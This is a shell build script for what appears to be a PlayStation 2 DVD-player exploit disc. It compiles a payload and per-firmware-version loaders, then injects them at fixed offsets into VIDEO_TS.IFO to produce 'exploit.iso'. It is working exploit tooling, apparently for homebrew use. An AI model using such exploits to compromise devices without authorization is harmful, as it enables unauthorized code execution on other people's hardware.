#!/bin/sh
# TODO: replace ee-gcc with EE_CC ?= ee-gcc
# TODO: move flags into oneline: EE_CFLAGS = -nostartfiles -nostdlib -ffreestanding -Wl,-z,max-page-size=0x1

echo "Building payload"
ee-gcc -Ttext=0x01FFF800 payload.c -o payload.elf -nostartfiles -nostdlib -ffreestanding -Os -Wl,-z,max-page-size=0x1 # 2048
ee-objcopy -O binary payload.elf payload.bin -Wl,-z,max-page-size=0x1
PAYLOAD_SIZE=$(stat -c '%s' payload.bin)
dd if=payload.bin of=udf/VIDEO_TS/VIDEO_TS.IFO bs=1 seek=$((0x3000)) count=$PAYLOAD_SIZE conv=notrunc

ENTRY=$(ee-objdump -t payload.elf | grep " _start")
echo "$ENTRY"

ENTRY=$(echo 0x"$ENTRY" | awk '{print $1}')
echo $ENTRY
# ENTRY=0x'grep -o "^\S*" <<< $ENTRY'
# Doesn't seem to work on MinGW toolchain, so set manually if you're using that:
# ENTRY=0x01fff99c
# echo $ENTRY

echo "Building crt0 (3.03)"
ee-gcc -Ttext=0x015FFF34 -DENTRY=$ENTRY -DGETBUFFERINTERNAL=0x262360 crt0.S -o crt0_3.03.elf -nostartfiles -nostdlib -ffreestanding -Wl,-z,max-page-size=0x1
ee-objcopy -O binary crt0_3.03.elf crt0_3.03.bin -Wl,-z,max-page-size=0x1
CRT0_303_SIZE=$(stat -c '%s' crt0_3.03.bin)
dd if=crt0_3.03.bin of=udf/VIDEO_TS/VIDEO_TS.IFO bs=1 seek=$((0x0e8c)) count=$CRT0_303_SIZE conv=notrunc

echo "Building crt0 (3.04M)"
ee-gcc -Ttext=0x01800180 -DENTRY=$ENTRY -DGETBUFFERINTERNAL=0x261548 crt0.S -o crt0_3.04M.elf -nostartfiles -nostdlib -ffreestanding -Wl,-z,max-page-size=0x1
ee-objcopy -O binary crt0_3.04M.elf crt0_3.04M.bin -Wl,-z,max-page-size=0x1
CRT0_304M_SIZE=$(stat -c '%s' crt0_3.04M.bin)
dd if=crt0_3.04M.bin of=udf/VIDEO_TS/VIDEO_TS.IFO bs=1 seek=$((0x2d00)) count=$CRT0_304M_SIZE conv=notrunc

echo "Building jump for 3.04J"
ee-gcc -Ttext=0x012811E4 -DJUMP=0x01281340 jump.S -o jump_3.04J.elf -nostartfiles -nostdlib -ffreestanding -Wl,-z,max-page-size=0x1
ee-objcopy -O binary jump_3.04J.elf jump_3.04J.bin -Wl,-z,max-page-size=0x1
JUMP_304J_SIZE=$(stat -c '%s' jump_3.04J.bin)
dd if=jump_3.04J.bin of=udf/VIDEO_TS/VIDEO_TS.IFO bs=1 seek=$((0x2724)) count=$JUMP_304J_SIZE conv=notrunc

echo "Building crt0 (3.04J)"
ee-gcc -Ttext=0x01281340 -DENTRY=$ENTRY -DGETBUFFERINTERNAL=0x261560 crt0.S -o crt0_3.04J.elf -nostartfiles -nostdlib -ffreestanding -Wl,-z,max-page-size=0x1
ee-objcopy -O binary crt0_3.04J.elf crt0_3.04J.bin -Wl,-z,max-page-size=0x1
CRT0_304J_SIZE=$(stat -c '%s' crt0_3.04J.bin)
dd if=crt0_3.04J.bin of=udf/VIDEO_TS/VIDEO_TS.IFO bs=1 seek=$((0x2880)) count=$CRT0_304J_SIZE conv=notrunc

echo "Building crt0 (3.10)"
ee-gcc -Ttext=0x01500014 -DENTRY=$ENTRY -DGETBUFFERINTERNAL=0x2986a0 crt0.S -o crt0_3.10.elf -nostartfiles -nostdlib -ffreestanding -Wl,-z,max-page-size=0x1
ee-objcopy -O binary crt0_3.10.elf crt0_3.10.bin -Wl,-z,max-page-size=0x1
CRT0_310_SIZE=$(stat -c '%s' crt0_3.10.bin)
dd if=crt0_3.10.bin of=udf/VIDEO_TS/VIDEO_TS.IFO bs=1 seek=$((0x2bb4)) count=$CRT0_310_SIZE conv=notrunc

echo "Building crt0 (3.11)"
ee-gcc -Ttext=0x01500014 -DENTRY=$ENTRY -DGETBUFFERINTERNAL=0x2952f0 crt0.S -o crt0_3.11.elf -nostartfiles -nostdlib -ffreestanding -Wl,-z,max-page-size=0x1
ee-objcopy -O binary crt0_3.11.elf crt0_3.11.bin -Wl,-z,max-page-size=0x1
CRT0_311_SIZE=$(stat -c '%s' crt0_3.11.bin)
dd if=crt0_3.11.bin of=udf/VIDEO_TS/VIDEO_TS.IFO bs=1 seek=$((0x2954)) count=$CRT0_311_SIZE conv=notrunc

echo "CREATE UDF ISO"
genisoimage -udf -o exploit.iso udf/

echo "Done."

echo "For the Dragon image:"
echo "Insert  crt0_3.03.bin into VIDEO_TS.IFO at offset 0x0e8c"
echo "Insert jump_3.04J.bin into VIDEO_TS.IFO at offset 0x2724"
echo "Insert crt0_3.04J.bin into VIDEO_TS.IFO at offset 0x2880"
echo "Insert  crt0_3.11.bin into VIDEO_TS.IFO at offset 0x2954"
echo "Insert  crt0_3.10.bin into VIDEO_TS.IFO at offset 0x2bb4"
echo "Insert crt0_3.04M.bin into VIDEO_TS.IFO at offset 0x2d00"
echo "Insert    payload.bin into VIDEO_TS.IFO at offset 0x3000"
# generate 1 image for all 3.03+, 3.04M is the same in that terms
# echo "For 3.04M only image:"
# echo "Insert crt0_3.04M.bin at 0x2d00, and payload.bin at 0x3000"
